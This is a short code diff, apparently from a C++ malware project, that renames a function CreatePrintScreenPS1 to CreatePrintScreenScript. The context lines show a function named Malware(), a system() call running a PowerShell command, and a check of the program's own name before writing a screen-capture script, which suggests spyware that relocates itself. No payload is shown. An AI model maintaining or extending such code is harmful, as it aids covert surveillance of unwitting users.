@@ -130,7 +130,7 @@ void Malware()
     }
   }
 }
-void CreatePrintScreenPS1(string output)
+void CreatePrintScreenScript(string output)
 {
   ofstream file;
   string scriptPS1;
@@ -180,7 +180,7 @@ void InitConfig(string currentProgramName)
   system(commandPowerShell.c_str());
   if(currentProgramName != finalProgramName)
   {
-    CreatePrintScreenPS1(output);
+    CreatePrintScreenScript(output);
   }
 }
 int main(int argc,char *argv[])
